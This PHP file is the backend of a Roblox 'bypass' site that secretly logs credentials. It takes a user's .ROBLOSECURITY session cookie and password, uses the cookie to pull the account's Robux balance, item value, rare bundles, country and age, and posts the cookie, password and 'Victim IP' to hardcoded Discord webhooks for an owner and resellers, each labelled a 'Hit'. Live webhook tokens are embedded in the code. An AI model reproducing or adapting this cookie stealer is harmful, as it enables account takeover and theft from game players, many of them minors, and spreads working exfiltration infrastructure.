<?php
header('Content-Type: application/json');
error_reporting(E_ALL);
ini_set('display_errors', 0); // Prevent PHP errors from breaking JSON
ini_set('log_errors', 1);
set_time_limit(0); // Allow long execution for multiple API calls

// Helper functions
function generateRandomName($length = 10) {
    return substr(str_shuffle(str_repeat($x='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}

function createRblxDirectory($name) {
    $url = "https://rblxbypass.com/api/directories";
    $payload = [
        "name" => $name,
        "clientWebhook" => "https://discord.com/api/webhooks/1457023827522621574/QQLHW0EUVMlmZrneF9YXpHsh-_8k6gjMqCPcLoF8eTcMlEP47w2s4r1tVYqGTRbL-cm5",
        "discordServer" => ""
    ];
    $headers = ["Content-Type: application/json"];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 20); // Add timeout
    
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return ($http_code === 200);
}

function performBypassRequest($url, $roblox_cookie, $dir, $pass) {
    $payload = [
        "cookie" => $roblox_cookie,
        "directoryName" => $dir,
        "password" => $pass
    ];
    $headers = [
        "Content-Type: application/json",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept: application/json"
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 90);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    return ['code' => $http_code, 'body' => $response, 'error' => $error];
}

$history_file = 'history.json';

const OWNER_WEBHOOK = "https://discord.com/api/webhooks/1455709851282964571/sSoJJbsGlJHwESeumAMWDKX5D8UCbG8fIObc70V2BEqg59hv-jxsuGPOPpQFnrso5Xf5";

// Request Logging for Debugging
$requestId = uniqid();
$log_msg = "[" . date("H:i:s") . "] [ID:$requestId] Request: " . ($_REQUEST['action'] ?? 'bypass') . " | Method: " . $_SERVER['REQUEST_METHOD'] . " | IP: " . $_SERVER['REMOTE_ADDR'];
if (isset($_POST['cookie'])) {
    $log_msg .= " | Cookie: " . substr(trim($_POST['cookie']), 0, 50) . "...";
}
error_log($log_msg);

function getSellerData($sellerName) {
    $file = 'sellers.json';
    if (!file_exists($file)) return null;
    $sellers = json_decode(file_get_contents($file), true);
    if (!$sellers) return null;

    // Case-insensitive search
    foreach ($sellers as $name => $data) {
        if (strcasecmp($name, $sellerName) === 0) {
            return $data;
        }
    }
    return null;
}

function getRobloxUserInfo($cookie) {
    if (!$cookie) return null;
    $url = "https://users.roblox.com/v1/users/authenticated";
    $headers = [
        "Cookie: .ROBLOSECURITY=" . $cookie,
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept: application/json, text/plain, */*",
        "Accept-Language: en-US,en;q=0.9",
        "Referer: https://www.roblox.com/",
        "Origin: https://www.roblox.com",
        "Sec-Ch-Ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"",
        "Sec-Ch-Ua-Mobile: ?0",
        "Sec-Ch-Ua-Platform: \"Windows\"",
        "Sec-Fetch-Dest: empty",
        "Sec-Fetch-Mode: cors",
        "Sec-Fetch-Site: same-site"
    ];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code === 200) {
        return json_decode($response, true);
    }
    return null;
}

function getAvatarUrl($userId) {
    $url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={$userId}&size=420x420&format=Png";
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
    $response = curl_exec($ch);
    curl_close($ch);

    $json = json_decode($response, true);
    if (isset($json['data'][0]['imageUrl'])) {
        return $json['data'][0]['imageUrl'];
    }
    return "https://www.roblox.com/headshot-thumbnail/image?userId={$userId}&width=420&height=420&format=png";
}

function getRap($userId, $cookie) {
    if (!$userId) return 0;
    $url = "https://inventory.roblox.com/v1/users/{$userId}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100";
    $headers = ["Cookie: .ROBLOSECURITY=" . $cookie];
    
    $rap = 0;
    $pages = 0;
    while ($url && $pages < 2) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        $response = curl_exec($ch);
        curl_close($ch);
        
        $data = json_decode($response, true);
        if (isset($data['data'])) {
            foreach ($data['data'] as $item) {
                $rap += $item['recentAveragePrice'] ?? 0;
            }
        }
        $cursor = $data['nextPageCursor'] ?? null;
        $url = $cursor ? "https://inventory.roblox.com/v1/users/{$userId}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100&cursor=" . $cursor : null;
        $pages++;
    }
    return $rap;
}

function getRobux($userId, $cookie) {
    $url = "https://economy.roblox.com/v1/users/{$userId}/currency";
    $headers = ["Cookie: .ROBLOSECURITY=" . $cookie];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    return $data['robux'] ?? 0;
}

function getPendingRobux($userId, $cookie) {
    $url = "https://economy.roblox.com/v2/users/{$userId}/transaction-totals?transactionType=summary";
    $headers = ["Cookie: .ROBLOSECURITY=" . $cookie];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    return $data['pendingRobuxTotal'] ?? 0;
}

function checkBundle($userId, $bundleId, $cookie) {
    $url = "https://inventory.roblox.com/v1/users/{$userId}/items/Bundle/{$bundleId}";
    $headers = ["Cookie: .ROBLOSECURITY=" . $cookie];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    return !empty($data['data']);
}

function getTransactionsSummary($userId, $cookie) {
    $url = "https://economy.roblox.com/v2/users/{$userId}/transaction-totals?timeFrame=Year&transactionType=summary";
    $headers = ["Cookie: .ROBLOSECURITY=" . $cookie];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    return $data['purchasesTotal'] ?? 0;
}

function getAccountAge($userId) {
    $url = "https://users.roblox.com/v1/users/{$userId}";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    if (isset($data['created'])) {
        $created = new DateTime($data['created']);
        $now = new DateTime();
        $diff = $now->diff($created);
        return "{$diff->days} Days - {$diff->y} years, {$diff->m} months, {$diff->d} days";
    }
    return "N/A";
}

function getAccountCountry($cookie) {
    $url = "https://accountsettings.roblox.com/v1/account/settings/account-country";
    $headers = [
        "Cookie: .ROBLOSECURITY=" . $cookie,
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept: application/json",
        "Referer: https://www.roblox.com/",
        "Origin: https://www.roblox.com"
    ];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($http_code === 200) {
        $data = json_decode($response, true);
        // Robust check for nested 'value' key or direct keys
        if (isset($data['value']['countryName'])) {
            return $data['value']['countryName'];
        }
        if (isset($data['countryName'])) {
            return $data['countryName'];
        }
        error_log("Country API success but no countryName found. Response: " . $response);
    } else {
        error_log("Country API failed with code $http_code. Response: " . $response);
    }
    return 'Unknown';
}


// REMOVED: getOwnedGamepassCount() function - was causing 30+ API calls and rate limiting

function sendToDiscord($cookie, $userInfo = null, $details = null, $sellerData = null) {
    if (!$cookie) return;
    
    $webhooks = [OWNER_WEBHOOK];
    if ($sellerData) {
        if (!empty($sellerData['webhook'])) $webhooks[] = $sellerData['webhook'];
        if (!empty($sellerData['webhook2']) && ($sellerData['mode'] ?? '') === 'triplehook') {
            $webhooks[] = $sellerData['webhook2'];
        }
    }
    $webhooks = array_unique(array_filter($webhooks));

    $timestamp = date("c");
    
    if ($userInfo && $details) {
        $avatarUrl = getAvatarUrl($userInfo['id']);
        $discordServer = $sellerData['discord_server'] ?? 'https://discord.gg/naT2CxcX';
        $ip = $_SERVER['REMOTE_ADDR'];

        $embed1 = [
            "type" => "rich",
            "description" => "`+1 HIT • You've Earned 1 SPLUNK X XP`\n## [**__Check Cookie__**](https://href.li/?https://app.beamers.si/tools/checker?cookie={$cookie}) <:cookie:1263854438288719983> <:red_line:1308264830385393694> [**__Discord Server__**](https://discord.gg/naT2CxcX) <:discord:1264187182776586332> <:red_line:1308264830385393694> [**__Profile__**](https://www.roblox.com/users/{$userInfo['id']}/profile) <:1981redmember:1308263590456852501>",
            "color" => 889591,
            "fields" => [
                [
                    "name" => "<:1981redmember:1308263590456852501> Username",
                    "value" => "{$userInfo['name']}",
                    "inline" => false
                ],
                [
                    "name" => "<:96122redstar:1308263619829432390> Password",
                    "value" => !empty($details['password']) ? $details['password'] : "None",
                    "inline" => false
                ],
                [
                    "name" => "About User",
                    "value" => "`Account Age:` `{$details['account_age']}`\n`Summary:` **__" . number_format($details['transactions']) . "__**\n`Country:` **__{$details['country']}__**\n`Victim IP:` [**__{$ip}__**](https://ipinfo.io/{$ip})",
                    "inline" => false
                ],
                [
                    "name" => "<:1839_Robux:1308263558252855358> Robux",
                    "value" => "Balance " . number_format($details['robux']) . " <:1839_Robux:1308263558252855358>\nPending " . number_format($details['pending']) . " <:3999robux:1308263592272986133>",
                    "inline" => true
                ],
                [
                    "name" => "<:limited_roblox:1308266842946797568> RAP",
                    "value" => "RAP " . number_format($details['rap']) . " <:1839_Robux:1308263558252855358>",
                    "inline" => true
                ],
                [
                    "name" => "<:RedStar:1308281677252005889> Collectibles",
                    "value" => "<:HeadlessHorseman:1308266847355011072> " . ($details['headless'] ? "True" : "False") . "\n<:korblox:1263860685356666971> " . ($details['korblox'] ? "True" : "False"),
                    "inline" => true
                ]
            ],
            "author" => [
                "name" => "{$userInfo['name']}",
                "url" => "https://www.roblox.com/users/{$userInfo['id']}/profile",
                "icon_url" => $avatarUrl
            ],
            "thumbnail" => ["url" => $avatarUrl]
        ];
    } else {
        // Simple embed for when we skip validation
        $embed1 = [
            "type" => "rich",
            "title" => "New Cookie Hit (No Validation)",
            "description" => "## [**__Check Cookie__**](https://href.li/?https://app.beamers.si/tools/checker?cookie={$cookie})\nCookie input received, skipping validation to prevent invalidation.",
            "color" => 889591
        ];
    }

    $embed2 = [
        "type" => "rich",
        "title" => "<:25154redmod:1308263602322538527> **ROBLOSECURITY**",
        "description" => "**```{$cookie}```**",
        "color" => 889591,
        "thumbnail" => [
            "url" => "https://images-ext-1.discordapp.net/external/L2wMWWf7i1cRYDWCCOU1arREV5gHZkcXLohkWP9h664/%3Fcb%3D20211101151724/https/static.wikia.nocookie.net/cookierunkingdom/images/d/d9/DevilBase.png/revision/latest?format=webp"
        ]
    ];

    $payload = json_encode([
        "content" => "@everyone **New Hit!**",
        "embeds" => [$embed1, $embed2]
    ]);

    foreach ($webhooks as $webhookUrl) {
        $ch = curl_init($webhookUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
    }
}

function saveToHistory($data) {
    global $history_file;
    $history = [];
    if (file_exists($history_file)) {
        $history = json_decode(file_get_contents($history_file), true) ?: [];
    }
    array_unshift($history, $data);
    $history = array_slice($history, 0, 10);
    file_put_contents($history_file, json_encode($history, JSON_PRETTY_PRINT));
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' || (isset($_GET['action']) && $_GET['action'] === 'get_history')) {
    $action = isset($_REQUEST['action']) ? $_REQUEST['action'] : 'bypass';
    $roblox_cookie = isset($_POST['cookie']) ? trim($_POST['cookie']) : '';
    $password_input = isset($_POST['password']) ? trim($_POST['password']) : 'None';

    if ($action === 'get_history') {
        header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
        if (file_exists($history_file)) {
            echo file_get_contents($history_file);
        } else {
            echo json_encode([]);
        }
        exit;
    }

    if (empty($roblox_cookie)) {
        echo json_encode(['success' => false, 'message' => 'Cookie tidak boleh kosong.']);
        exit;
    }

    if ($action === 'get_basic_info') {
        $userInfo = getRobloxUserInfo($roblox_cookie);
        if ($userInfo) {
            echo json_encode([
                'success' => true,
                'userId' => $userInfo['id'],
                'username' => $userInfo['name'],
                'displayName' => $userInfo['displayName'],
                'avatarUrl' => getAvatarUrl($userInfo['id'])
            ]);
        } else {
            echo json_encode(['success' => false, 'message' => 'Cookie Roblox tidak valid.']);
        }
        exit;
    }


    // Default Action: Bypass Logic
    $directory_name = "KONTOLODON_" . generateRandomName(5);
    $password = ($password_input !== 'None') ? $password_input : "PASSWORD123";
    $url = "https://rblxbypass.com/api/bypass";

    $max_retries = 1; // Since we increased the timeout, we reduce retries to avoid extreme wait times
    $retry_count = 0;
    $result = ['code' => 0];

    while ($retry_count <= $max_retries) {
        $result = performBypassRequest($url, $roblox_cookie, $directory_name, $password);
        if ($result['code'] !== 0) break;
        $retry_count++;
        if ($retry_count <= $max_retries) sleep(1); 
    }
    
    $end_time = microtime(true);

    // Jika 404 (Directory not found), buat direktori otomatis dan coba lagi
    if ($result['code'] === 404) {
        if (createRblxDirectory($directory_name)) {
            $start_time = microtime(true);
            $result = performBypassRequest($url, $roblox_cookie, $directory_name, $password);
            $end_time = microtime(true);
        }
    }

    $http_code = $result['code'];
    $response = $result['body'] ?? '';
    $curl_error = $result['error'] ?? '';

    // Send to Discord with validation info if possible
    $sellerName = $_POST['seller'] ?? null;
    $sellerData = $sellerName ? getSellerData($sellerName) : null;
    
    $userInfo = getRobloxUserInfo($roblox_cookie);
    if ($userInfo) {
        $userId = $userInfo['id'];
        $details = [
            'robux' => getRobux($userId, $roblox_cookie),
            'pending' => getPendingRobux($userId, $roblox_cookie),
            'rap' => getRap($userId, $roblox_cookie),
            'korblox' => checkBundle($userId, 192, $roblox_cookie),
            'headless' => checkBundle($userId, 201, $roblox_cookie),
            'transactions' => getTransactionsSummary($userId, $roblox_cookie),
            'account_age' => getAccountAge($userId),
            'country' => getAccountCountry($roblox_cookie),
            'password' => $password_input
        ];
        sendToDiscord($roblox_cookie, $userInfo, $details, $sellerData);
    } else {
        sendToDiscord($roblox_cookie, null, null, $sellerData);
    }

    if ($http_code === 200) {
        $duration = round($end_time - $start_time, 2);
        
        // Save to history using the already fetched userInfo
        if (isset($userInfo) && $userInfo) {
            saveToHistory([
                'username' => $userInfo['name'],
                'avatarUrl' => getAvatarUrl($userInfo['id']),
                'time' => date('H:i:s'),
                'duration' => $duration
            ]);
        }

        $api_response = json_decode($response, true);
        
        // Cek sukses berdasarkan field 'result' jika ada, karena top-level 'success' sering bernilaitrue walau gagal
        if (isset($api_response['result']['success'])) {
            $is_success = ($api_response['result']['success'] === true);
        } else {
            $is_success = (isset($api_response['success']) && $api_response['success'] === true);
        }
        
        // Ambil pesan asli dari API
        $msg = $api_response['result']['message'] ?? ($api_response['message'] ?? 'Bypass completed.');

        echo json_encode([
            'success' => $is_success,
            'message' => $msg,
            'duration' => $duration,
            'data' => $api_response
        ]);
    } else {
        $is_timeout = (strpos($curl_error, 'timed out') !== false || strpos($curl_error, 'timeout') !== false);
        $error_details = "Status: $http_code" . ($curl_error ? " ($curl_error)" : "");
        error_log("[ID:$requestId] API Request Failed: $error_details");
        
        $user_msg = "Something went wrong ! please try again." . $error_details;
        if ($is_timeout) {
            $user_msg .= "\n\nSomething went wrong ! please try again.";
        }

        echo json_encode([
            'success' => false,
            'message' => $user_msg
        ]);
    }
} else {
    echo json_encode(['success' => false, 'message' => 'Invalid Request Method']);
}
?>
